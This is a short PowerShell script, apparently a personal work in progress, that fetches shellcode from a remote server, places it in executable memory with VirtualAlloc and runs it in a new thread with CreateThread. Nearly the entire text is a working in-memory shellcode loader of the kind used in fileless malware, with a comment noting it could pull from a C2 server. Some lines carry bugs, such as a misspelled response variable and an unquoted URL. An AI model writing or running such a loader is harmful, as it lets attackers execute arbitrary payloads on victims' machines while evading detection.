#this script will reach out to server on the specified port, get the shellcode and reflectively load it into memory and execute it.

# TODO
# define the target server and port             check
# get the shellcode from the server             check
# allocate memory for the shellcode             check
# copy the shellcode to the allocated memory    check
# create a thread toexecute the shellcode       
# optional cleanup like free the memory etc.


$server = https://github.com/crzyscholar/wherever_I_store_the_shellcode
$port = 8080 # this doesn't really apply here, I'm getting the shellcode from github not c2 server

$respone = Invoke-WebRequest -uri "$server:$port/shellcode" -UseBasicParsing
$bytes = $response.Content

$VirtualAlloc = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("Kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
}
"@
# https://www.pinvoke.net/default.aspx/kernel32.virtualalloc

$Kernel32 = Add-Type -MemberDefinition $VirtualAlloc -Name "Kernel32" -Namespace Win32 -passThru
$Buffer = $Kernel32::VirtualAlloc([IntPtr]::Zero, $Bytes.Length, 0x3000, 0x40) # MEM_COMMIT | MEM_RESERVE and PAGE_EXECUTE_READWRITE 

[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $Buffer, $bytes.Length) # https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-9.0

$CreateThread = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("Kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
}
"@
# https://www.pinvoke.net/default.aspx/kernel32/CreateThread.html

$Kernel32 = Add-Type -MemberDefinition $CreateThread -Name "Kernel32" -Namespace Win32 -passThru
$ThreadID = 0

$Kernel32::CreateThread([IntPtr]::Zero, 0, $Buffer, [IntPtr]::Zero, 0, [ref]$ThreadID) # https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread

Start-Sleep -Seconds 10
# free the memory? maybe using marshall.FreeHGlobal. idk if there's a need to do that though.
# [System.Runtime.InteropServices.Marshal]::FreeHGlobal($Buffer)
